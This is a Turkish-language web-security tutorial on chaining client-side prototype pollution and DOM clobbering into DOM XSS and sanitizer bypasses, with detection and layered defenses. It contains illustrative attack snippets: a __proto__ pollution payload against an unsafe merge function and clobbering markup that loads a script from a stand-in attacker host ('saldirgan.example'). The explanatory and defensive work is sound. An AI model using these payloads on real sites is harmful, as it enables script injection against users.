# Client-Side Prototype Pollution'ın DOM XSS'e Zincirlenmesi ve DOM Clobbering

## Giriş ve Bu Konunun Önemi

Modern web güvenliğinde tekil zafiyetler giderek nadirleşiyor; asıl tehlike, tek başına zararsız görünen birkaç davranışın bir **gadget zinciri** (gadget chain) hâlinde birleşerek sömürülebilir bir sonuç üretmesinden geliyor. Bu makalenin konusu tam olarak budur: istemci tarafı (client-side) **Prototype Pollution**, **DOM Clobbering** ve **DOM-based XSS** kavramlarının nasıl ayrı ayrı var olduğu ve nasıl bir araya gelerek DOMPurify gibi olgun sanitizer'ların bypass edilmesine kadar giden zincirler oluşturduğu.

Bu üç teknik geleneksel zafiyet listelerinde genellikle bağımsız satırlar olarak yer alır. Oysa gerçek dünyadaki güncel bypass'ların çoğu, bu üçünün kesişiminde doğar. Amacımız operasyonel bir saldırı reçetesi vermek değil; **mekanizmayı anlamak** ve buna dayalı **tespit ile savunma** kurmaktır.

## Temel Kavramlar

### Prototype Pollution nedir?

JavaScript'te neredeyse her nesne, bir **prototype** zincirine bağlıdır. Sıradan bir nesnenin prototype'ı `Object.prototype`'tır. Bir özelliğe (property) eriştiğinizde, JavaScript önce nesnenin kendisine bakar; bulamazsa prototype zincirini yukarı doğru tarar. Bu, kalıtımın (inheritance) çalışma mantığıdır.

**Prototype Pollution**, saldırganın `Object.prototype` üzerine yazabilmesi durumudur. Kritik nokta şudur: `Object.prototype`'a eklenen bir özellik, **o özelliği kendisi tanımlamamış TÜM sıradan nesnelerde** görünür hâle gelir. Yani tek bir yere yazarak, uygulamanın her yerindeki nesnelerin "varsayılan" davranışını değiştirmiş olursunuz.

Kök neden genellikle şudur: kullanıcı kontrollü anahtarları (key) güvensiz biçimde nesne özelliklerine yazan **recursive merge**, **deep clone**, **object path set** veya query string parse fonksiyonları. Klasik tehlikeli anahtarlar `__proto__`, `constructor` ve `prototype`'tır. Kavramsal örnek:

```javascript
// Güvensiz bir "deep merge" mantığı
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];  // key = "__proto__" ise felaket
    }
  }
}

// Saldırgan kontrollü girdi (ör. JSON.parse ile gelmiş)
merge({}, JSON.parse('{"__proto__": {"polluted": "evet"}}'));

({}).polluted;   // "evet"  --> artık HER nesnede bu özellik "var" gibi
```

İstemci tarafında bu girdi çoğunlukla **URL query string**, **hash fragment (`#...`)**, `postMessage` verisi, `localStorage` içeriği veya sunucudan gelen JSON'dan doğar. `?__proto__[x]=y` biçimindeki query parametrelerini nesneye çeviren zayıf parser'lar tipik kaynaktır.

Önemli bir dürüstlük notu: Prototype Pollution tek başına genellikle **doğrudan kod çalıştırmaz**. Kendisi bir "durum bozma" primitifidir; asıl etkiyi, bu bozulmuş durumu *tüketen* bir **gadget** ile birleştiğinde gösterir.

### DOM-based XSS nedir?

DOM-based XSS, zararlı verinin sunucuya hiç uğramadan, tamamen tarayıcı içindeki JavaScript tarafından bir **source**'tan (ör. `location.hash`, `location.search`, `document.referrer`) alınıp bir **sink**'e (ör. `innerHTML`, `document.write`, `eval`, `setAttribute`) güvensiz biçimde akıtılmasıyla oluşur. Klasik XSS'ten farkı, zafiyetin sunucu yanıtında değil, istemci kodunun akışında yaşamasıdır.

### DOM Clobbering nedir?

**DOM Clobbering**, sayfaya JavaScript enjekte edemediğiniz (yani script çalıştıramadığınız) ama **HTML enjekte edebildiğiniz** durumlarda kullanılan bir tekniktir. Temel fikir: HTML elementlerinin `id` ve `name` öznitelikleri, tarayıcı tarafından otomatik olarak **global isimlere ve DOM erişim yollarına** dönüştürülür.

Örneğin sayfaya `<a id="config"></a>` eklerseniz, JavaScript tarafında `window.config` artık o `<a>` elementini işaret eder. Uygulama kodu `if (window.config) { ... }` gibi bir kontrol yapıyorsa, siz o değeri **HTML ile "ezmiş" (clobber)** olursunuz. Daha ileri örnekler:

```html
<!-- window.x.y erişimini üretmek -->
<a id="x"></a>
<a id="x" name="y" href="zararlı-değer"></a>
```

Aynı `id`'ye sahip birden fazla element, o isim altında bir `HTMLCollection` üretir ve `name` ile alt-özelliklere erişim sağlanabilir. `<form>` içindeki isimlendirilmiş elementler de form nesnesinin özelliklerini clobber edebilir. Böylece **script çalıştırmadan**, sadece markup ile JavaScript'in okuduğu değerleri manipüle edersiniz.

Kritik bağlantı: DOM Clobbering ile üretilen değerler çoğunlukla **string değildir**; genellikle DOM element nesneleridir. Ancak `href` gibi özniteliklere sahip elementlerde, bu nesne bir string bağlamında kullanıldığında (ör. konkatenasyon) `toString()` çağrılır ve `href` değeri geri döner. Bu, saldırgana kontrollü bir string kaçırma yolu verir.

## Üçünün Birleşmesi: Gadget Zinciri Mantığı

Şimdi asıl mesele. Bu teknikler tek başlarına sınırlıdır, ama birbirlerinin eksiğini kapatırlar:

- **Prototype Pollution** durumu bozar ama tek başına genellikle çalıştırılabilir bir etki üretmez; bir "tüketici gadget" arar.
- **DOM Clobbering** HTML-only bağlamlarda global değer üretir ama JavaScript çalıştıramaz; onu okuyup tehlikeli bir işleme sokan bir kod parçasına ihtiyaç duyar.
- **Sanitizer'lar** (DOMPurify gibi) script'i ve tehlikeli özellikleri temizler ama bazı yapılandırma değerlerini veya davranışlarını **çalışma anında** okur.

Zincir mantığı şöyle işler:

1. Saldırgan bir **HTML enjeksiyon** noktası bulur (sanitizer'dan geçmesi gereken kullanıcı içeriği).
2. Sanitizer, davranışını belirleyen bir yapılandırma değerini **çalışma anında bir nesne özelliğinden okur**. Eğer bu özellik nesnede yoksa, prototype zincirinden okunur.
3. Saldırgan, önceden **Prototype Pollution** ile `Object.prototype` üzerine bu yapılandırma anahtarını yazmıştır. Böylece sanitizer, saldırganın belirlediği yapılandırmayla çalışır (ör. belirli bir etiketi/özniteliği "izinli" sayar).
4. Alternatif veya ek olarak, sanitizer'ın "güvenli" bıraktığı bir HTML parçası **DOM Clobbering** ile uygulamanın başka bir kod yolundaki değeri ezer; o kod yolu ezilen değeri bir **sink**'e (ör. `innerHTML`, `script.src`) taşır.
5. Sonuç: sanitizer teknik olarak "çalışmış" olsa da, ya yanlış yapılandırmayla temizlemiş ya da temizlenmiş çıktı ikinci bir gadget'la tekrar tehlikeli hâle gelmiştir. **XSS** doğar.

### Kavramsal örnek: Prototype Pollution ile sanitizer yapılandırmasını etkilemek

Birçok kütüphane, opsiyonel yapılandırmayı `options.someFlag` gibi okur ve `options` boş geldiğinde varsayılana düşer. Eğer bu okuma, özelliğin "var olup olmadığını" prototype zincirine bakmadan kontrol etmiyorsa:

```javascript
function process(options = {}) {
  // options.allowUnsafe nesnede yoksa Object.prototype'tan okunur
  if (options.allowUnsafe) {
    // güvensiz yol
  }
}
```

Saldırgan daha önce `Object.prototype.allowUnsafe = true` kirlenmesini gerçekleştirdiyse, `process({})` çağrısı bile güvensiz yola girer. Sanitizer'larda buna benzer, izin listelerini veya kaçış (escaping) davranışını etkileyen iç okumalar, tarihsel bypass'ların temelini oluşturmuştur.

Önemli dürüstlük notu: DOMPurify'ın belirli sürümlerinde bu tür bypass'lar bildirilmiş ve kütüphane bunlara karşı sertleştirilmiştir (ör. iç yapılandırma nesnelerini `Object.create(null)` ile prototype'sız oluşturmak, `hasOwnProperty` ile okumak gibi). Burada belirli bir CVE numarası veya "şu sürümde şu bayrakla çalışır" gibi kesin bir iddiada bulunmuyorum; **mekanizmayı** anlatıyorum. Somut bir sürümü değerlendirirken o sürümün changelog'una ve güvenlik danışmalarına bakmak gerekir.

### Kavramsal örnek: DOM Clobbering ile sink'e ulaşmak

Diyelim uygulama, sanitize edilmiş içeriği DOM'a koyduktan sonra şöyle bir kod çalıştırıyor:

```javascript
// Uygulama, bir yapılandırma script'ini dinamik yüklüyor
const loader = document.getElementById('cfg');
const url = loader ? loader.src : '/varsayilan.js';
const s = document.createElement('script');
s.src = url;
document.body.appendChild(url ? s : null);
```

Saldırgan, sanitizer'ın izin verdiği markup ile şunu enjekte edebilirse:

```html
<img id="cfg" src="//saldirgan.example/kotu.js">
```

`document.getElementById('cfg')` artık saldırganın elementini döndürür ve `loader.src` saldırganın URL'sini verir. Burada hiçbir script özniteliği kullanılmamıştır; sanitizer `<img>`'ı zararsız görmüştür, ama uygulama kodu onu bir **script kaynağına** dönüştürmüştür. Bu, "sanitizer temiz dedi ama zincir XSS üretti" durumunun özüdür.

`toString()` üzerinden string kaçırma da buradaki kritik inceliktir: DOM Clobbering ile üretilen çoğu değer nesnedir, ama `<a>`/`<area>` elementlerinin `href`'i string bağlamında beklenen değeri döndürür; bu da tip kontrolü zayıf kodlarda tam bir string kontrolü sağlar.

## Kök Neden Analizi

Bu zincirlerin ortak kök nedenleri şunlardır:

- **Güvenilmez veriyle nesne anahtarı yazmak.** `__proto__`, `constructor`, `prototype` anahtarlarını filtrelemeyen merge/clone/path-set fonksiyonları Prototype Pollution kapısıdır.
- **Prototype'a duyarlı okuma.** `if (obj.flag)` veya `for...in` ile okuma, prototype'tan gelen kirli değerleri "gerçek" veri sanar. `Object.create(null)` ile üretilmemiş, `Object.hasOwn`/`hasOwnProperty` ile korunmayan okumalar risklidir.
- **Global/DOM erişim yollarına körü körüne güvenmek.** `window.X`, `document.getElementById(...)` veya isimlendirilmiş form alanlarının değerine, tipini ve kaynağını doğrulamadan güvenmek DOM Clobbering'i mümkün kılar.
- **Sanitizasyon ile kullanım arasındaki bağlam kayması.** Sanitizer bir bağlamda (HTML içeriği) güvenli olan çıktıyı üretir; uygulama onu başka bir bağlamda (script kaynağı, yapılandırma) tüketir. Sanitizer bu ikinci bağlamı bilmez.

## Tespit

### Kod analizi (statik) ile tespit

- **Prototype Pollution için:** Kaynak kodda recursive merge, `extend`, `deepClone`, `set(obj, path, value)`, query-string-to-object dönüşümleri arayın. Anahtar filtresi olmayan (`__proto__`/`constructor`/`prototype` blocklamayan) yerleri işaretleyin. `for (const k in src) target[k] = ...` kalıbı klasik risktir.
- **Duyarlı okuma için:** `hasOwnProperty` olmadan yapılan `obj[userKey]` okumalarını ve nesnelerin `Object.create(null)` yerine `{}` ile kurulduğu yapılandırma noktalarını gözden geçirin.
- **DOM Clobbering için:** `document.getElementById`, `window.<isim>`, `document.<isim>`, `form.<isim>` üzerinden gelen değerlerin bir sink'e (script src, innerHTML, location, eval) aktığı akışları izleyin. Tip kontrolü (`typeof x === 'string'`, `x instanceof HTMLElement`) yokluğu risk işaretidir.
- **Sink envanteri:** `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`, `eval`, `Function`, `setTimeout(string)`, `script.src`, `a.href = javascript:` gibi sink'leri haritalayın ve source'lara kadar geri izleyin (taint analysis).

### Çalışma zamanı (dinamik) tespit

- Test ortamında sayfayı yükledikten sonra `Object.prototype` üzerinde beklenmeyen özellikler olup olmadığını kontrol edin. Kavramsal bir "kanary": bilinen bir kirlenme anahtarı enjekte edip uygulama davranışının değişip değişmediğini gözlemlemek.
- CSP raporlarını (`report-uri`/`report-to`) izleyin: beklenmeyen `script-src` ihlalleri, clobbering veya enjeksiyon kaynaklı yüklemelerin sinyali olabilir.
- Otomatik tarama araçları (DOM-aware tarayıcılar) Prototype Pollution ve DOM Clobbering için özel probe'lar içerir; bunları CI/CD'ye entegre etmek erken yakalama sağlar.

## Savunma

Savunma katmanlı olmalıdır; tek bir önlem yeterli değildir.

### Prototype Pollution'a karşı

- **Tehlikeli anahtarları reddedin.** Kullanıcı verisinden gelen anahtarları nesneye yazmadan önce `__proto__`, `constructor`, `prototype`'ı bloklayın. Ancak yalnız blocklist'e güvenmeyin.
- **Prototype'sız nesneler kullanın.** Kullanıcı verisi tutacak sözlükler için `Object.create(null)` veya `Map` tercih edin; bunların prototype zinciri yoktur, dolayısıyla kirletilecek `Object.prototype` bağlantısı da yoktur.
- **`Object.freeze(Object.prototype)`.** Uygulama başında prototype'ı dondurmak, birçok kirlenme girişimini engeller. Yan etkileri test edin; bazı kütüphaneler prototype'a yazmayı bekleyebilir.
- **Güvenli parse.** `JSON.parse` sonrası merge yerine şema doğrulaması (schema validation) uygulayın; sadece beklenen anahtarları geçirin (allowlist).
- **Güncel kütüphaneler.** Merge/clone kütüphanelerinin Prototype Pollution'a karşı yamalı sürümlerini kullanın.

### DOM Clobbering'e karşı

- **İsim/id çakışmasından kaçının.** Kritik global değişkenleri `window` üzerinden değil, modül kapsamı (module scope), closure veya `const` ile tutun; bunlar DOM isimleriyle ezilemez.
- **Tip ve kaynak doğrulaması.** `document.getElementById`/global okumalardan gelen değerlerin beklenen tipte olduğunu kontrol edin (`typeof`, `instanceof`). Bir "yapılandırma" değerinin bir HTML elementi olmadığından emin olun.
- **Sanitizer yapılandırmasını sıkın.** Kullanıcı HTML'ini temizlerken `id` ve `name` özniteliklerine izin vermeyin veya sınırlandırın. DOMPurify'ın `SANITIZE_DOM`/`SANITIZE_NAMED_PROPS` benzeri, clobbering'e karşı sertleştirme seçeneklerini değerlendirin (somut seçenek adları ve davranışları için kullandığınız sürümün belgelerine bakın).

### DOM XSS ve zincire karşı

- **Güvenilir tek bir sanitizer.** İçeriği DOM'a koymadan önce olgun, bakımı yapılan bir sanitizer'dan geçirin ve **en güncel sürümü** kullanın; bilinen bypass'lar sürümlerde kapatılır.
- **Trusted Types.** Destekleyen tarayıcılarda **Trusted Types** politikası (`require-trusted-types-for 'script'`) DOM XSS sink'lerine ham string atanmasını engeller; bu, zincirin son adımını kesen güçlü bir savunmadır.
- **Content Security Policy (CSP).** `script-src`'yi sıkı tutun, `'unsafe-inline'` ve `'unsafe-eval'`'den kaçının, nonce/hash kullanın. Clobbering ile script yüklemesi denense bile CSP kaynağı reddedebilir.
- **Bağlam ayrımı.** Sanitize edilmiş içeriği asla ikinci bir bağlamda (script kaynağı, URL, yapılandırma) yeniden tehlikeli sink'e taşımayın. Sanitizasyonun hangi bağlam için yapıldığını netleştirin.

## Yaygın Hatalar

- **"Sanitizer kullanıyorum, güvendeyim" yanılgısı.** Sanitizer yalnızca temizlediği bağlam için güvenlidir. Çıktısını farklı bir sink'e taşırsanız garanti ortadan kalkar. Zincirlerin çoğu tam bu boşlukta yaşar.
- **Sadece `__proto__` blocklamak.** `constructor.prototype` üzerinden de kirlenme mümkündür. Tek anahtar filtresi yetmez; prototype'sız yapı ve şema doğrulaması gerekir.
- **DOM'dan okunan değeri "string" varsaymak.** DOM Clobbering değerleri nesnedir; ama `toString()`/`href` ile string gibi davranabilir. Tip kontrolünü atlamak zafiyet üretir.
- **Prototype Pollution'ı "düşük etkili" sayıp ertelemek.** Tek başına zararsız görünse de, uygun bir gadget'la RCE-benzeri sonuçlara (istemcide XSS, sunucuda kod çalıştırma) kadar tırmanabilir. Gadget'ın bugün olmaması, yarınki bir kütüphane güncellemesiyle ortaya çıkmayacağı anlamına gelmez.
- **CSP'yi tek savunma sanmak.** CSP güçlüdür ama yanlış yapılandırılmış (`unsafe-inline`, geniş `script-src`) bir politika clobbering-tabanlı yüklemeleri durdurmayabilir. Trusted Types ile birlikte düşünün.
- **Global değişkenleri `window`'da tutmak.** Rahat olduğu için `window.config` gibi kullanmak, kodu doğrudan clobbering'e açar. Modül kapsamı çok daha güvenlidir.

## Sonuç

Bu üç teknik ayrı ayrı öğretilir ama gerçek risk kesişimlerindedir. **Prototype Pollution** durumu sessizce bozar; **DOM Clobbering** script çalıştırmadan değerleri ezer; **sanitizer'lar** ise her ikisinin de dolaylı etkisine açık olabilir. Güncel DOMPurify bypass tartışmalarının bu gadget zincirleri etrafında dönmesinin nedeni budur.

Savunmanın özü: **veriyi bağlamına göre işlemek**, **prototype'a asla güvenmemek**, **DOM'dan gelen değeri tip ve kaynak açısından doğrulamak** ve **Trusted Types + sıkı CSP + güncel sanitizer**'ı birlikte kullanarak zincirin her halkasını ayrı ayrı kırmaktır. Tek bir katmana yaslanmak, bu tür zincirlerin var oluş amacını ıskalamak olur.
